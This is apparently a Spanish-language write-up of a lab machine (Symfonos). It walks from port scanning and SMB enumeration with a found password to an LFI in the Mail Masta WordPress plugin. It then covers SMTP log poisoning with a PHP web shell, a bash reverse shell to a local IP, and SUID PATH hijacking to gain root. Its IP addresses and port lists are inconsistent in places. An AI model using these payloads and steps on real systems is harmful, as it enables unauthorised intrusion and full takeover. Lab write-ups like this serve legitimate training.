# Summary
- IP: 192.168.0.115
- Ports: 22,25,80,139,445,
- OS: Linux (Debian Buster)
- Services & Applications:
	-  22 -> OpenSSH 7.4p1 Debian 10+deb9u
	-  25 -> Postfix smtpd
	-  80-> Apache httpd 2.4.25
	- 139 -> Samba smbd 3.X - 4.X
	- 445 -> Samba smbd 4.5.16-Debian

# Recon

- Escaneo básico de puertos:

```
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.129.26 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```
$sudo nmap -p21,80,2222 -sCV 10.10.129.26 -oN targeted
```

- Enumeramos los recursos compartidos con Samba:

```
$smbmap -H 192.168.0.103
```

- Analizamos el directorio "Anonymous" y descargamos lo que tiene:

```
$smbmap -H 192.168.0.103 -r anonymous

$smbmap -H 192.168.0.103 --download anonymous/attention.txt
```

- Obtenemos psibles contraseñas leyendo el archivo "attention.txt", accedemos a los recursos del user "helios" con una de estas contraseñas y descargamos lo que hay dentro:

```
$smbmap -H 192.168.0.103 -u helios -p qwerty -r helios
$smbmap -H 192.168.0.103 -u helios -p qwerty --download helios/research.txt
$smbmap -H 192.168.0.103 -u helios -p qwerty --download helios/todo.txt
```

- Leemos el archivo "todo.txt" y encontramos un directorio "/h3l105" accedemos a este y encontramos un wordpress.
- Analizamos la página Wordpress, revisando el código fuente enumeramos los plugis en búsqueda de alguno vulnerable, encontramos el plugin "mail masta", buscamos vulns:

```
$searchsploit mail masta
```

- Vemos que hay un LFI, aprovechamos esta vuln y hacemos un escaneo básico de LFI buscando posibles caminos para pasar a RCE:

http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

- Al no encontrar nada, nos damos cuenta que el puerto 25 está abierto (protocolo smtp) así que  buscamos en el directorio:

http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios 

- Encontramos el log mail del usuario helios, por lo que podemos hacer LOG POISONING, mandamos un mail al usuario helios desde un email cualquiera con código php incrustado que genere un parámetro "cmd" en el que podamos insertar comandos:

```
$telnet 192.168.0.103 25

MAIL FROM: andres
RCPT TO: helios
DATA
<?php system($_GET['cmd']); ?>
```

- Ahora podemos ejecutar comandos apuntando al parámetro "cmd", nos entablamos una reverse shell para ganar acceso a la máquina:

http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.106/443 0>%261

- Hacemos tratamiento de tty.

# ESCALANDO PRIVILEGIOS:

- Buscamos privilegios SUID:

```
$ find / -perm -4000 2>/dev/null
```

- Encontramos un archivo sospechoso "/opt/statuscheck" lo analizamos:

```
$ strings /opt/statuscheck
```

- Vemos que en una parte del binario ejecuta el comando "curl" usando ruta relativa, lo cual podemos explotar con PATH HIJAKING:

```
$ nano /tmp/curl
$ chmod +x /tmp/curl
$ export PATH=/tmp:$PATH
$ ./statuscheck
$ ls -l /bin/bash
```

- Accedemos como ROOT 
```
$bash -p
```


